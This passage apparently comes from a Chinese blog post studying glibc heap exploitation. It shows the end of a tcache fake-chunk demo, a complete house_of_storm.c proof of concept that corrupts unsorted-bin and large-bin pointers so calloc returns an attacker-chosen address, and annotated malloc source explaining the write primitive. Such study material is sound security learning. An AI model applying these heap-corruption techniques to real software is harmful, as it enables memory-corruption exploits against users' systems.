	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		chunks<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">free</span><span class="token punctuation">(</span>chunks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">long</span> fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment">// this is the size</span>

	fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span> <span class="token comment">// nextsize</span>

	<span class="token keyword">void</span> <span class="token operator">*</span>victim <span class="token operator">=</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">void</span> <span class="token operator">*</span>allocated <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc(0x30): %p, fake chunk: %p\n"</span><span class="token punctuation">,</span> allocated<span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span>allocated <span class="token operator">==</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>与2.23的区别为在释放fake_chunk前先将tcache填满</p>
<h3 id="house-of-storm-c"><a href="#house-of-storm-c" class="headerlink" title="house_of_storm.c"></a>house_of_storm.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">char</span> filler<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> target<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 

<span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// clearenv();</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// Get the AMOUNT to shift over for size and the offset on the largebin.</span>
<span class="token comment">// Needs to be a valid minimum sized chunk in order to work.</span>
<span class="token keyword">int</span> <span class="token function">get_shift_amount</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> pointer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	
	<span class="token keyword">int</span> shift_amount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">long</span> <span class="token keyword">long</span> ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>pointer<span class="token punctuation">;</span>	
	
	<span class="token keyword">while</span><span class="token punctuation">(</span>ptr <span class="token operator">></span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		ptr <span class="token operator">=</span> ptr <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">;</span> 
		shift_amount <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span> 
	<span class="token punctuation">&#125;</span>	

	<span class="token keyword">return</span> shift_amount <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// Want amount PRIOR to this being zeroed out</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

	<span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">char</span> <span class="token operator">*</span>unsorted_bin<span class="token punctuation">,</span> <span class="token operator">*</span>large_bin<span class="token punctuation">,</span> <span class="token operator">*</span>fake_chunk<span class="token punctuation">,</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span>
	<span class="token keyword">int</span><span class="token operator">*</span> tcaches<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"House of Storm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"======================================"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Preparing chunks for the exploit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Put one chunk into unsorted bin and the other into the large bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The unsorted bin chunk MUST be larger than the large bin chunk."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">/*
	Putting a chunk into the unsorted bin and another
	into the large bin.
	*/</span>
	unsorted_bin <span class="token operator">=</span> <span class="token function">malloc</span> <span class="token punctuation">(</span> <span class="token number">0x4e8</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// size 0x4f0 </span>

	<span class="token comment">// prevent merging </span>
	<span class="token function">malloc</span> <span class="token punctuation">(</span> <span class="token number">0x18</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> 

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Find the proper chunk size to allocate."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Must be exactly the size of the written chunk from above."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">int</span> shift_amount <span class="token operator">=</span> <span class="token function">get_shift_amount</span><span class="token punctuation">(</span>unsorted_bin<span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Shift Amount: %d\n"</span><span class="token punctuation">,</span> shift_amount<span class="token punctuation">)</span><span class="token punctuation">;</span> 

	<span class="token class-name">size_t</span> alloc_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>unsorted_bin<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> shift_amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>alloc_size <span class="token operator">&lt;</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk Size: 0x%lx\n"</span><span class="token punctuation">,</span> alloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Chunk size is too small"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	alloc_size <span class="token operator">=</span> <span class="token punctuation">(</span>alloc_size <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFE</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span> <span class="token comment">// Remove the size bits</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"In this case, the chunk size is 0x%lx\n"</span><span class="token punctuation">,</span> alloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>alloc_size <span class="token operator">&amp;</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>alloc_size <span class="token operator">&amp;</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>alloc_size <span class="token operator">&amp;</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocation size has bit 4 of the size set or "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"mmap and non-main arena bit check will fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please try again! :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Exiting..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

	<span class="token comment">// If the chunk would go into the TCache, we need to fill up</span>
	<span class="token comment">// the TCache in order to prevent TCache stashing from happening.</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>alloc_size <span class="token operator">&lt;</span> <span class="token number">0x410</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Fill TCache of the allocation size amount if the size of the target chunk is a TCache size chunk (0x20-0x410)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done to prevent usage of TCache stashing"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


		<span class="token comment">// Fill up the TCache for the proper size</span>
		<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			tcaches<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>alloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token function">free</span><span class="token punctuation">(</span>tcaches<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Not filling up the TCache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	large_bin  <span class="token operator">=</span>  <span class="token function">malloc</span> <span class="token punctuation">(</span> <span class="token number">0x4d8</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// size 0x4e0 </span>
	<span class="token comment">// prevent merging </span>
	<span class="token function">malloc</span> <span class="token punctuation">(</span> <span class="token number">0x18</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// FIFO </span>
	<span class="token function">free</span> <span class="token punctuation">(</span> large_bin <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// put small chunks first </span>
	<span class="token function">free</span> <span class="token punctuation">(</span> unsorted_bin <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Put the 'large bin' chunk into the large bin</span>
	unsorted_bin <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x4e8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>unsorted_bin<span class="token punctuation">)</span><span class="token punctuation">;</span>


	<span class="token comment">// The address that we want to write to!</span>
	fake_chunk <span class="token operator">=</span> target <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Vulnerability! Overwrite unsorted bins 'bk' pointer with our target location.\n This is our target location to get from the allocator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	
	<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>unsorted_bin<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>fake_chunk<span class="token punctuation">;</span> <span class="token comment">// unsorted_bin->bk</span>

	<span class="token comment">// Only needs to be a valid address. </span>
	<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> large_bin <span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>fake_chunk  <span class="token operator">+</span>  <span class="token number">8</span> <span class="token punctuation">;</span>  <span class="token comment">// large_bin->fd</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"of your fake chunk."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Misalign the location in order to use the primitive as a SIZE value."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The 'offset' changes depending on if the binary is PIE (5) or not PIE (2)."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Vulnerability #2!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Overwrite large bins bk->nextsize with the address to put our fake chunk size at."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> large_bin<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>fake_chunk <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> shift_amount<span class="token punctuation">;</span> <span class="token comment">// large_bin->bk_nextsize</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Make allocation of the size that the value will be written for."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Once the allocation happens, the madness begins"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Once in the unsorted bin, the 'large bin' chunk will be used in orer to "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"write a fake 'size' value to the location of our target."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"After this, the target will have a valid size."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Next, the unsorted bin will see that the chunk (in unsorted_bin->bk) has a valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"size and remove it from the bin."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"With this, we have pulled out an arbitrary chunk!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"String before: %s\n"</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"String pointer: %p\n"</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Make a call to 'calloc' instead of 'malloc' in order to "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"not use the TCache on the allocation. Had to fill TCache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"because stashing would prevent the exploit from working"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	ptr <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span>alloc_size<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">strncpy</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token string">"\x41\x42\x43\x44\x45\x46\x47"</span><span class="token punctuation">,</span> <span class="token number">0x58</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"String after %s\n"</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fake chunk ptr: %p\n"</span><span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请第一个unsorted_bin，再申请一个小chunk防止合并</p>
<p>再申请7个chunk用于填满tcache</p>
<p>申请large_bin，再申请一个小chunk防止合并</p>
<p>首先释放large_bin，再释放unsorted_bin&#x3D;&#x3D;&#x3D;》</p>
<p>将unsorted_bin申请回来，此时large_bin并入large bin&#x3D;&#x3D;》</p>
<p>再释放unsorted_bin:</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220625212000111.png"></p>
<p>修改这两个chunk的bk指针，修改large_bin的bk_nextsize:</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220625212656296.png"></p>
<p>偏移：<strong>shift_amount</strong>：非0字节数-1&#x3D;&#x3D;》2</p>
<p><strong>调用calloc：</strong></p>
<p>避开tcache&#x3D;&#x3D;》unsorted bin中不止一个chunk，会先将unsorted_chunk并入large bin中</p>
<p>会根据大小先将unsorted_chun并入large bin&#x3D;&#x3D;》</p>
<p><strong>large bin链入过程：</strong>在malloc大循环中，每一次都会从unsorted bin中弹出一个chunk，不符合要求就会被并入small bin或者large bin中</p>
<p>首先解链：</p>
<pre class="language-c" data-language="c"><code class="language-c">bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
<span class="token comment">//bck = fake_chunk</span>
<span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
<span class="token comment">//unsorted_chunks (av)->bk = fake_chunk</span>
bck<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//fake_chunk+0x10 = unsorted_chunks (av)</span></code></pre>



<pre class="language-c" data-language="c"><code class="language-c">   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
       victim_index <span class="token operator">=</span> <span class="token function">smallbin_index</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
       bck <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
       fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token comment">//chunk属于large_bin</span>
   <span class="token punctuation">&#123;</span>
     victim_index <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
     bck <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//bck为bin的头指针</span>
     fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>

     <span class="token comment">/* maintain large bins in sorted order */</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>fwd <span class="token operator">!=</span> bck<span class="token punctuation">)</span>
       <span class="token punctuation">&#123;</span>
         <span class="token comment">/* Or with inuse bit to speed comparisons */</span>
         size <span class="token operator">|=</span> PREV_INUSE<span class="token punctuation">;</span>
         <span class="token comment">/* if smaller than smallest, bypass loop below */</span>
         <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>bk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>bk<span class="token punctuation">)</span><span class="token punctuation">)</span>
           <span class="token punctuation">&#123;</span>
             fwd <span class="token operator">=</span> bck<span class="token punctuation">;</span>
             bck <span class="token operator">=</span> bck<span class="token operator">-></span>bk<span class="token punctuation">;</span>

             victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span>
             victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>
             fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
         <span class="token keyword">else</span>
           <span class="token punctuation">&#123;</span>
             <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">&lt;</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
               <span class="token punctuation">&#123;</span>
                 fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>
			  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
               <span class="token punctuation">&#125;</span>

             <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
               <span class="token comment">/* Always insert in the second position.  */</span>
               fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span>
             <span class="token keyword">else</span>
                 <span class="token comment">//unsorted_chunk->size > largebin_chunk->size</span>
               <span class="token punctuation">&#123;</span>
                 victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
                 <span class="token comment">//修改unsorted bin的fd_nextsize指向large bin中已存在的chunk</span>
                 victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>
                 <span class="token comment">//修改unsorted bin的bk_nextsize指向large bin中已存在chunk的bk->bk_nextsize</span>
                 <span class="token comment">//victim->bk_nextsize = tar-0x28-偏移</span>
                 fwd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
                 
                 victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
                 <span class="token comment">//tar-0x8-偏移 = unsorted_chunk</span>
               <span class="token punctuation">&#125;</span>
             bck <span class="token operator">=</span> fwd<span class="token operator">-></span>bk<span class="token punctuation">;</span>
             <span class="token comment">//bck = tar-0x8</span>
           <span class="token punctuation">&#125;</span>
       <span class="token punctuation">&#125;</span>
     <span class="token keyword">else</span>
       victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
<span class="token function">mark_bin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
   victim<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
   victim<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
   fwd<span class="token operator">-></span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>
   bck<span class="token operator">-></span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span></code></pre>

<p><strong>正常情况：</strong></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220627213128763.png"></p>
<p><strong>布置fake_chunk后：</strong></p>
<p>重点：</p>
<pre class="language-c" data-language="c"><code class="language-c">victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
<span class="token comment">//tar-0x8-偏移 = unsorted_chunk</span></code></pre>

<p>&#x3D;&#x3D;》fake_chunk+6 &#x3D; 0x405250</p>
